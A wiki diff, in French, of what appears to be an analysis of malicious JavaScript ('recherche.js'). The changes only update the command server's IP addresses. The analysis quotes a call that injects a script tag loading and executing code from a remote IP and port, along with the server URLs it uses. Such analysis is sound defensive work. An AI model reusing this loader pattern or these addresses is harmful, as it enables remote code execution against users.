@@ -61,7 +61,7 @@ La variable *myport* est initialisée avec une valeur entre « 3 000 » et « 4 
 
 La variable *url1* est initialisée par l'appel de la méthode « chang(nmh) » où *mnh* correspond au numéro de port.
 
-  * *url1* = "http://46.105.36.13:3661/"
+  * *url1* = "http://91.121.52.98:3661/"
 
 Cette URL est l'URL utilisée pour communiquer avec le serveur. Toute communication avec le serveur se fera par une commande `HTTP GET` sur cette URL.
 
@@ -120,7 +120,7 @@ La fonction « firsty() » ne contient qu'une ligne l'appel à la fonction « ag
 
 Dans notre cas :
 {{{
- agix( "http://46.105.36.13:3495/40Simon*371309157636446650", 4);
+ agix( "http://91.121.52.98:3495/40Simon*371309157636446650", 4);
 }}}
 
 
@@ -128,7 +128,7 @@ Dans notre cas :
 
 La fonction « agix() » est la base de la communication de type _Ajax_ entre le client et le serveur et est déclarée à la ligne 406 du fichier « recherche.js ».
 
-Cette fonction crée un nouvelle balise « {{{<script>}}} » pour l'arborescence avec comme valeur de l'attribut « src » l'URL « http://178.33.122.73:3495/40Simon*371309157636446650 ».
+Cette fonction crée un nouvelle balise « {{{<script>}}} » pour l'arborescence avec comme valeur de l'attribut « src » l'URL « http://91.121.52.98:3495/40Simon*371309157636446650 ».
 
 L'URL précédente charge le fichier suivant qui sera exécuté en !JavaScript :
 
